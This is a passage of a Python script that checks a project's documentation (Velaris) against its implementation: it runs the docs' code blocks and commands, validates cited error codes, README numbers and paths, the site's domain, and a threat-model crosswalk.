    absent = [w for w in words[1:] if w not in out
              and not (w.startswith("-") and w in top)]
    if code != 0 or not out.startswith("usage:") or err.strip():
        r.wrong(f"{where_text}: `velaris {words[0]} --help` exited {code}: "
                f"{shorten(out + err)}")
    elif absent:
        r.wrong(f"{where_text}: `{span}` - `velaris {words[0]} --help` does "
                f"not name {absent}")
    else:
        r.ok(f"{where_text}: `{span}` - velaris {words[0]} --help names it")
    return r


def inline_spans(prose: list[Any]) -> list[Any]:
    """[(span, line)] for every `velaris ...` span, one across a line break
    included."""
    numbered, text = [], ""
    for n, line in prose:
        numbered.append((len(text), n))
        text += line + "\n"
    found = []
    for m in re.finditer(r"`([^`]+)`", text):
        span = " ".join(m.group(1).split())
        if span.startswith("velaris "):
            line = max(n for at, n in numbered if at <= m.start())
            found.append((span, line))
    return found


# ---------------------------------------------------------------------------
# drift

STOP = set("a an the of or and to in on is are be by for with that this it its "
           "as at from not no what which when while than their there one can "
           "has have was were but into how".split())


def words_of(text: str) -> set[Any]:
    text = re.sub(r"[`*'\"()\[\],.;:!?|/]", " ", text.lower())
    out = set()
    for w in text.split():
        w = w.strip("-")
        if len(w) < 3 or w in STOP:
            continue
        for suffix in ("ing", "ed", "es", "s"):
            if w.endswith(suffix) and len(w) - len(suffix) >= 3:
                w = w[:-len(suffix)]
                break
        out.add(w)
    return out


CODE = re.compile(r"(?<![A-Za-z0-9_])E(\d{3})(?![0-9])")
GROUP = re.compile(r"(?<![A-Za-z0-9_])E(\d)(\d|x)x(?![0-9A-Za-z])")


def check_codes() -> Result:
    r = Result("error codes")
    removed = {entry[0]
               for entry in cast(tuple[Any, ...], velaris.REMOVED_ERRORS)}
    cited = described = 0
    used_paraphrases = set()
    for doc in CODE_DOCS:
        lines = (HERE / doc).read_text(encoding="utf-8").splitlines()
        section = ""
        for n, line in enumerate(lines, 1):
            if line.startswith("## "):
                section = line[3:].strip()
            # docs/crosswalk.md quotes AIUC-1's requirement identifiers, whose
            # E001 to E017 are AIUC-1's and not Velaris's error codes (8.3)
            if doc == "docs/crosswalk.md" and (
                    section == "AIUC-1" or "AIUC-1:" in line):
                continue
            for m in CODE.finditer(line):
                code = "E" + m.group(1)
                cited += 1
                if code in removed and "removed" not in line.lower():
                    r.wrong(f"{doc}:{n}: {code} was removed, and the line does "
                            "not say so")
                elif code not in velaris.ERROR_TABLE and code not in removed:
                    r.wrong(f"{doc}:{n}: {code} is not in velaris.ERROR_TABLE")
            for m in GROUP.finditer(line):
                prefix = "E" + m.group(1) + (m.group(2) if m.group(2) != "x"
                                             else "")
                if not any(c.startswith(prefix) for c in velaris.ERROR_TABLE):
                    r.wrong(f"{doc}:{n}: {m.group(0)} holds no code in "
                            "velaris.ERROR_TABLE")
            pairs = []
            if line.lstrip().startswith("|"):
                cells = [c.strip() for c in line.strip().strip("|").split("|")]
                for i, cell in enumerate(cells[:-1]):
                    bare = cell.strip("`* ")
                    if re.fullmatch(r"E\d{3}(?:/E\d{3})*", bare):
                        if cells[i + 1] not in ("error", "warning", "note"):
                            pairs += [(c, cells[i + 1]) for c in bare.split("/")]
                        break
            for m in re.finditer(r"(?<![A-Za-z0-9_])(E\d{3}) \(([^)]+)\)", line):
                pairs.append((m.group(1), m.group(2)))
            for code, said in pairs:
                table = velaris.ERROR_TABLE.get(code)
                if table is None:
                    continue
                described += 1
                mine = words_of(said)
                if mine and len(mine & words_of(table)) * 2 >= len(mine):
                    continue
                key = next((k for k in PARAPHRASES if k[0] == doc
                            and k[1] == code and said.startswith(k[2])), None)
                if key:
                    used_paraphrases.add(key)
                    continue
                r.wrong(f"{doc}:{n}: {code} is described as {said!r}; the "
                        f"table says {table!r}")
    for key in sorted(set(PARAPHRASES) - used_paraphrases):
        r.wrong(f"PARAPHRASES lists {key}, which no document has now")
    r.ok(f"{cited} citations of an error code in {len(CODE_DOCS)} documents are "
         f"in velaris.ERROR_TABLE; {described} descriptions match it or are "
         f"listed ({len(used_paraphrases)} listed)")
    return r


def readme_numbers(blocks: list[Any], prose: list[Any]) -> Result:
    """Every number README.md states is generated, or NOT_COUNTS says why."""
    import build_readme
    r = Result("numbers in README.md")
    text = (HERE / "README.md").read_text(encoding="utf-8")
    covered = []
    for doc, template in build_readme.IN_TEXT:
        if doc == "README.md":
            pattern, _ = build_readme.in_text_pattern(template)
            covered += [m.group(0) for m in pattern.finditer(text)]
    def blank(m: Any) -> Any:
        return re.sub(r"[^\n]", " ", m.group(0))

    # markers with their values, comments and code spans - one across a line
    # break too - are taken out before the lines are read
    joined = "\n".join(t for _, t in prose)
    joined = build_readme.MARK.sub(blank, joined)
    joined = re.sub(r"<!--.*?-->", blank, joined, flags=re.S)
    joined = re.sub(r"`[^`]*`", blank, joined)
    chunks = []          # (line, text to scan)
    in_generated = False
    for (n, original), line in zip(prose, joined.split("\n")):
        if "<!-- generated:" in original:
            in_generated = True
        if "<!-- /generated -->" in original:
            in_generated = False
            continue
        if in_generated:
            continue
        line = re.sub(r"\]\([^)]*\)", "]", line)
        line = re.sub(r"<[^>]+>", " ", line)
        line = re.sub(r"https?://\S+", " ", line)
        chunks.append((n, line))
    for b in blocks:
        if b.doc != "README.md" or b.info not in ("sh", "console", "vel"):
            continue
        for i, line in enumerate(b.body, 1):
            for cov in covered:
                if normal(cov) and normal(cov) in normal(line):
                    line = ""
            mark = "//" if b.info == "vel" else "#"
            at = line.find(" " + mark) if not line.startswith(mark) else 0
            if at >= 0 and mark in line:
                chunks.append((b.line + i, line[at:]))
    used = set()
    for n, line in chunks:
        for m in re.finditer(r"(?<![\w.§'@:-])\d[\d,]*(?:\.\d+)*(?![\w.]*\d)", line):
            number = m.group(0).rstrip(",")
            if "." in number:
                continue
            reason = None
            for i, (pattern, why) in enumerate(NOT_COUNTS):
                for hit in re.finditer(pattern, line):
                    if hit.start() <= m.start() < hit.end():
                        reason = why
                        used.add(i)
            if reason is None:
                r.wrong(f"README.md:{n}: {number} is neither generated nor in "
                        f"NOT_COUNTS: {line.strip()[:100]!r}")
    for i, (pattern, why) in enumerate(NOT_COUNTS):
        if i not in used:
            r.wrong(f"NOT_COUNTS has {pattern!r}, which matches nothing now")
    r.ok(f"no other number in README.md is left ungenerated "
         f"({len(NOT_COUNTS)} not counts, each with why)")
    return r


def readme_paths(prose: list[Any]) -> Result:
    r = Result("paths README.md names")
    text = "\n".join(t for _, t in prose)
    named = set()
    for target in re.findall(r"\]\(([^)\s]+)\)", text) + re.findall(
            r'src="([^"]+)"', text):
        if re.match(r"^(https?:|mailto:|#)", target):
            continue
        named.add(target.split("#")[0])
    tops = {p.name for p in HERE.iterdir()}
    for span in re.findall(r"`([^`\s]+)`", text):
        if re.fullmatch(r"[\w.-]+(/[\w.*-]*)+", span) \
                and span.split("/")[0] in tops:
            named.add(span)
        elif re.fullmatch(r"[\w-]+\.(py|md|cff)", span):
            named.add(span)
    checked = 0
    used = set()
    for name in sorted(named):
        if name in NOT_PATHS:
            used.add(name)
            continue
        checked += 1
        if not (glob.glob(str(HERE / name)) if "*" in name
                else (HERE / name).exists()):
            r.wrong(f"README.md names {name}, which is not in this repository")
    for name in sorted(set(NOT_PATHS) - used):
        r.wrong(f"NOT_PATHS has {name!r}, which README.md does not name now")
    r.ok(f"{checked} paths README.md names exist ({len(used)} others are "
         "a reader's own, each with why)")
    return r


def small_drift() -> Result:
    r = Result("drift")
    readme = (HERE / "README.md").read_text(encoding="utf-8").splitlines()
    head = next((i for i, ln in enumerate(readme) if ln.startswith("# ")), None)
    said = next((i for i, ln in enumerate(readme)
                 if "not a security boundary" in ln.lower()), None)
    if head is not None and said is not None and 0 <= said - head <= 8:
        r.ok(f"README.md says it is not a security boundary {said - head} "
             "lines below its headline")
    else:
        r.wrong("README.md does not say 'not a security boundary' within 8 "
                f"lines of its headline (headline {head}, sentence {said})")
    spec = (HERE / "SPEC.md").read_text(encoding="utf-8")
    m = re.search(r"^Version (\d+\.\d+\.\d+)\. ", spec, re.M)
    if m and m.group(1) == velaris.VERSION:
        r.ok(f"SPEC.md is labelled Version {velaris.VERSION}, as velaris.VERSION")
    else:
        r.wrong(f"SPEC.md is labelled {m.group(1) if m else 'no version'}; "
                f"velaris.VERSION is {velaris.VERSION} (python build_readme.py "
                "--write sets it)")
    for doc, before, after in FALLIBLE_LISTS:
        text = (HERE / doc).read_text(encoding="utf-8")
        start = text.find(before)
        end = text.find(after, start)
        if start < 0 or end < 0:
            r.wrong(f"{doc} no longer lists fallible builtins between "
                    f"{before!r} and {after!r}")
            continue
        named = set(re.findall(r"`(\w+)`", text[start:end]))
        want = set(velaris.FALLIBLE_BUILTINS) | {"get"}
        extra = named - want - {"py_close"}
        if named >= want and not extra:
            r.ok(f"{doc}: its list of fallible builtins is "
                 f"velaris.FALLIBLE_BUILTINS and get on a map "
                 f"({len(want)} names)")
        else:
            r.wrong(f"{doc}: its list of fallible builtins lacks "
                    f"{sorted(want - named)} and names {sorted(extra)}")
    for doc, pattern, holds in CONSTANTS:
        m = re.search(pattern, (HERE / doc).read_text(encoding="utf-8"))
        held = tuple(format(v, "g") if isinstance(v, float) else str(v)
                     for v in holds())
        if m is None:
            r.wrong(f"{doc} no longer reads {pattern!r}; CONSTANTS expects it")
        elif m.groups() != held:
            r.wrong(f"{doc} says {m.groups()} where it reads {pattern!r}; the "
                    f"implementation holds {held}")
        else:
            r.ok(f"{doc}: {', '.join(held)} - {m.group(0)[:60]!r}")
    return r


def build_readme_check() -> Result:
    r = Result("build_readme.py --check")
    done = subprocess.run([sys.executable, str(HERE / "build_readme.py"),
                           "--check"], cwd=HERE, capture_output=True, text=True,
                          encoding="utf-8", errors="replace", timeout=900,
                          env=ENV)
    for line in done.stdout.splitlines():
        if line.startswith("skip"):
            r.skip(f"build_readme.py: {line[4:].strip()}")
    last = done.stdout.strip().splitlines()[-1] if done.stdout.strip() else ""
    if done.returncode == 0:
        r.ok(f"build_readme.py --check: {last}")
    else:
        r.wrong(f"build_readme.py --check exited {done.returncode}:\n         "
                + "\n         ".join(done.stdout.strip().splitlines()[-12:])
                + shorten(done.stderr))
    return r


# ---------------------------------------------------------------------------

OLD_HOST = "gowrishankar-infra.github.io"
# 8.3: the documentation site is velaris-lang.dev. These are the only tracked
# files that may name its earlier address, each for the reason given.
OLD_HOST_ALLOWED = {
    "CHANGELOG.md": "the history of the releases that named it",
    "check_urls.py": "the test that the card's earlier address redirects",
    "check_docs.py": "this check",
    "velaris/predicates.py": "the earlier spelling of the two predicate "
                             "types, which a reader of Statements accepts",
    "policies/opa/capability.rego": "the policy admits a Statement written "
                                    "before 8.3",
    "policies/opa/capability_test.rego": "the test that it does",
    "docs/capability/v1/index.html": "the type's page names the spelling it "
                                     "is also read under",
    "docs/receipt/v1/index.html": "the type's page names the spelling it is "
                                  "also read under",
    "playground/index.html": "it holds the velaris package, predicates.py "
                             "among it",
    "docs/playground.html": "it holds the velaris package, predicates.py "
                            "among it",
}
# 8.3.1: the site is generated, and a page rendered from CHANGELOG.md holds
# the history above - as does the search index built from those pages. Every
# tree the build writes (the top, latest/ and <major.minor>/) has them.
OLD_HOST_ALLOWED_PATH = re.compile(
    r"docs/(?:latest/|\d+\.\d+/)?"
    r"(?:changelog-\d+(?:-\d+)?\.html|search-index\.json)")
OLD_HOST_ALLOWED_PATH_REASON = ("the rendered CHANGELOG, and the search "
                                "index built from it, name it in its history")
SITE_URL = re.compile(r"https?://velaris-lang\.dev(?:/[^\s<>\"'`)\]}|\\&]*)?")


def domain_check() -> Result:
    """No tracked file names the documentation site's earlier address but
    those OLD_HOST_ALLOWED lists, and every velaris-lang.dev URL a tracked
    file names is a page under docs/, which GitHub Pages serves there."""
    import urllib.parse
    res = Result("domain")
    try:
        listed = subprocess.run(["git", "ls-files", "-z"], cwd=HERE,
                                capture_output=True, timeout=120)
    except (OSError, subprocess.SubprocessError) as e:
        res.skip(f"the tracked files could not be listed ({e})")
        return res
    if listed.returncode != 0:
        res.skip("not a git checkout, so the tracked files cannot be listed")
        return res
    named: list[str] = []
    urls: dict[str, str] = {}
    for rel in sorted(f for f in listed.stdout.decode("utf-8", "replace")
                      .split("\0") if f):
        try:
            text = (HERE / rel).read_bytes().decode("utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        if (OLD_HOST in text and rel not in OLD_HOST_ALLOWED
                and not OLD_HOST_ALLOWED_PATH.fullmatch(rel)):
            named.append(f"{rel}:{text[:text.index(OLD_HOST)].count(chr(10)) + 1}")
        for m in SITE_URL.finditer(text):
            urls.setdefault(m.group(0).rstrip(".,;:!?*_"), rel)
    if named:
        res.wrong(f"{OLD_HOST}, the documentation site's earlier address, is "
                  f"named in {', '.join(named)}; the site is velaris-lang.dev")
    else:
        res.ok(f"no tracked file names {OLD_HOST} but the "
               f"{len(OLD_HOST_ALLOWED)} listed with their reasons, and the "
               f"generated pages that hold the changelog's history")
    missing = []
    for url, rel in sorted(urls.items()):
        path = urllib.parse.unquote(urllib.parse.urlsplit(url).path)
        page = HERE / "docs" / path.lstrip("/")
        if path in ("", "/") or path.endswith("/") or page.is_dir():
            page = page / "index.html"
        if not page.is_file():
            missing.append(f"{url} (named in {rel})")
    if missing:
        res.wrong("a velaris-lang.dev URL that docs/ does not serve: "
                  + "; ".join(missing))
    else:
        res.ok(f"every velaris-lang.dev URL a tracked file names "
               f"({len(urls)}) is a page docs/ serves")
    return res


def _section_headings(text: str, section: str) -> list[str]:
    """The ### headings under one ## heading of a Markdown page."""
    part = text.split(f"\n## {section}", 1)
    if len(part) < 2:
        return []
    body = part[1].split("\n## ", 1)[0]
    return [h.strip() for h in re.findall(r"^### (.+)$", body, re.M)]


def _table_first_cells(text: str, heading: str) -> list[str]:
    """The first cell of every row of the first table under a heading,
    bold and backticks taken off."""
    part = text.split(heading, 1)
    if len(part) < 2:
        return []
    rows = []
    for line in part[1].split("\n\n## ", 1)[0].splitlines():
        if not line.startswith("|") or line.startswith("|---"):
            continue
        cell = line.split("|")[1].strip().replace("**", "")
        rows.append(cell)
    return rows[1:]                        # the header row


def crosswalk_check() -> Result:
    """docs/crosswalk.md (8.3) names every guarantee in README.md's "Why
    Velaris" table and every row of THREAT_MODEL.md's Known open table, and
    nothing that is not one; every row it has gives one of the four words."""
    res = Result("crosswalk")
    page = HERE / "docs" / "crosswalk.md"
    if not page.exists():
        res.wrong("docs/crosswalk.md is missing")
        return res
    text = page.read_text(encoding="utf-8")
    readme = (HERE / "README.md").read_text(encoding="utf-8")
    threat = (HERE / "THREAT_MODEL.md").read_text(encoding="utf-8")
    guarantees = _table_first_cells(readme, "## Why Velaris")
    listed = _section_headings(text, "Every guarantee, and where it lands")
    listed = [h for h in listed if h != "Rows that rest on no guarantee"]
    if set(guarantees) != set(listed) or not guarantees:
        res.wrong(f"the crosswalk's guarantees are not README's: README has "
                  f"{sorted(set(guarantees) - set(listed))} the crosswalk "
                  f"does not, and the crosswalk has "
                  f"{sorted(set(listed) - set(guarantees))} README does not")
    else:
        res.ok(f"the crosswalk names README's {len(guarantees)} guarantees, "
               f"and no other")
    open_rows = [c.replace("`", "") for c in
                 _table_first_cells(threat, "## Known open")]
    open_listed = [h.replace("`", "") for h in _section_headings(
        text, "Every known-open item, and where it lands")]
    if set(open_rows) != set(open_listed) or not open_rows:
        res.wrong(f"the crosswalk's known-open items are not THREAT_MODEL's: "
                  f"missing {sorted(set(open_rows) - set(open_listed))}, "
                  f"extra {sorted(set(open_listed) - set(open_rows))}")
    else:
        res.ok(f"the crosswalk names THREAT_MODEL.md's {len(open_rows)} "
               f"known-open items, and no other")
    words = ("enforced", "recorded", "partial", "not addressed")
    bad = []
    in_controls = False
    rows = 0
    for line in text.splitlines():
        if not line.startswith("|"):
            in_controls = False
            continue
        cells = [c.strip() for c in line.split("|")[1:-1]]
        if cells == ["Control", "Velaris", "Status", "Where"]:
            in_controls = True
            continue
        if not in_controls or cells[0].startswith("---"):
            continue
        rows += 1
        if len(cells) != 4 or cells[2] not in words:
            bad.append(cells[0][:40])
    if not rows:
        bad.append("no control table at all")
    if bad:
        res.wrong(f"a control row whose status is not one of {words}: {bad}")
    else:
        res.ok("every control row gives enforced, recorded, partial or not "
               "addressed")
    return res


def main() -> int:
    started = time.time()
    documents = {doc: read_document(doc) for doc in DOCS}
    tasks: list[tuple[Block, Callable[..., Result]]]
    tasks, blocks = [], []
    summary = {"blocks": 0, "run": 0, "illustrative": 0, "partly": 0,
               "lines_marked": 0, "output": 0}
    setup = Result("markers")
    for doc, (doc_blocks, prose, stray) in documents.items():
        for n, text in stray:
            setup.wrong(f"{doc}:{n}: a marker that is not just above a fence: "
                        f"{text!r}")
        for b in doc_blocks:
            blocks.append(b)
            summary["blocks"] += 1
            for p in b.problems:
                setup.wrong(f"{b.label}: {p}")
            if b.illustrative:
                summary["illustrative"] += 1
                if b.info == "sh":
                    res = Result(b.label)
                    for n, t in logical_lines(b.body):
                        if not is_comment(t):
                            check_marked_line(res, f"{doc}:{b.line + n}", t)
                    if res.entries:
                        tasks.append((b, lambda res=res: res))
                continue
            if b.illustrative_lines:
                summary["partly"] += 1
                summary["lines_marked"] += len(b.illustrative_lines)
            run = {"sh": run_sh, "console": run_console, "vel": run_vel,
                   "python": run_python, "json": run_json,
                   "yaml": run_yaml}.get(b.info)
            if b.output_of:
                run = run_output_of
            if b.output:
                summary["output"] += 1
                continue                 # held to the block before, below
            if run is None:
                setup.wrong(f"{b.label}: a block of this kind runs nothing; "
                            "give it a kind the suite runs, or a marker")
                continue
            tasks.append((b, lambda b=b, run=run: run(b)))

    spans: dict[Any, Any] = {}
    for doc, (_, prose, _) in documents.items():
        for span, line in inline_spans(prose):
            spans.setdefault(span, []).append(f"{doc}:{line}")
    listed = {s: INLINE_LISTED[s] for s in spans if s in INLINE_LISTED}
    inline_tasks = [(s, lambda s=s: run_inline(s, spans[s]))
                    for s in spans if s not in INLINE_LISTED]
    for s in sorted(set(INLINE_LISTED) - set(spans)):
        setup.wrong(f"INLINE_LISTED has {s!r}, which no document has now")

    readme_blocks, readme_prose, _ = documents["README.md"]
    drift_tasks = [("domain", domain_check),
                   ("crosswalk", crosswalk_check),
                   ("build_readme", build_readme_check),
                   ("codes", check_codes),
                   ("numbers", lambda: readme_numbers(readme_blocks,
                                                      readme_prose)),
                   ("paths", lambda: readme_paths(readme_prose)),
                   ("drift", small_drift)]

    workers = max(2, min(8, (os.cpu_count() or 2)))
    with concurrent.futures.ThreadPoolExecutor(workers) as pool:
        block_futures = [(b, pool.submit(fn)) for b, fn in tasks]
        inline_futures = [(s, pool.submit(fn)) for s, fn in inline_tasks]
        drift_futures = [(name, pool.submit(fn)) for name, fn in drift_tasks]
        block_results = {}
        for b, f in block_futures:
            try:
                block_results[id(b)] = f.result()
            except Exception as e:          # a defect in this suite
                res = Result(b.label)
                res.wrong(f"{b.label}: the suite failed on it: {e!r}")
                block_results[id(b)] = res

    # output blocks, against the block that ran before them
    for doc, (doc_blocks, _, _) in documents.items():
        last = None
        for b in doc_blocks:
            found = block_results.get(id(b))
            if b.output:
                r = Result(b.label)
                if last is None or last[1].ran is False:
                    r.wrong(f"{b.label}: an output block with no block that "
                            "ran before it")
                else:
                    check_output(b, last[1].output, r,
                                 f"the block at line {last[0].line}")
                block_results[id(b)] = r
            elif b.output_of and found is not None:
                check_output(b, found.output, found, f"`{b.output_of}`")
            if found is not None and found.ran and not b.output_of:
                last = (b, found)
            elif b.output_of and found is not None:
                last = (b, found)

    failures = skips = 0

    def show(result: Result) -> None:
        nonlocal failures, skips
        for status, text in result.entries:
            failures += status == "WRONG"
            skips += status == "skip"
            print(ascii_text(f"  {status:6} {text}"))

    print("fenced code blocks")
    print("-" * 62)
    show(setup)
    for b in blocks:
        if id(b) in block_results:
            res = block_results[id(b)]
            if res.ran or b.output:
                summary["run"] += 1
            show(res)
    print()
    print("inline `velaris ...` commands")
    print("-" * 62)
    ran_inline = helped = 0
    for s, f in inline_futures:
        res = f.result()
        if any("--help" in t for _, t in res.entries):
            helped += 1
        else:
            ran_inline += 1
        show(res)
    for s, why in listed.items():
        print(ascii_text(f"  listed `{s}` - {why}"))
    print()
    print("drift")
    print("-" * 62)
    for name, f in drift_futures:
        show(f.result())

    seconds = time.time() - started
    print("-" * 62)
    print(f"blocks: {summary['blocks']} fenced - {summary['run']} run or "
          f"checked ({summary['output']} of them as output), "
          f"{summary['illustrative']} marked illustrative, and "
          f"{summary['lines_marked']} line(s) of {summary['partly']} run "
          "block(s) marked")
    print(f"inline commands: {len(spans)} distinct - {ran_inline} run, "
          f"{helped} held to --help, {len(listed)} listed")
    print(f"{failures} wrong, {skips} skipped, {seconds:.0f} s"
          + ("" if HAVE_Z3 else " (z3-solver not installed)"))
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
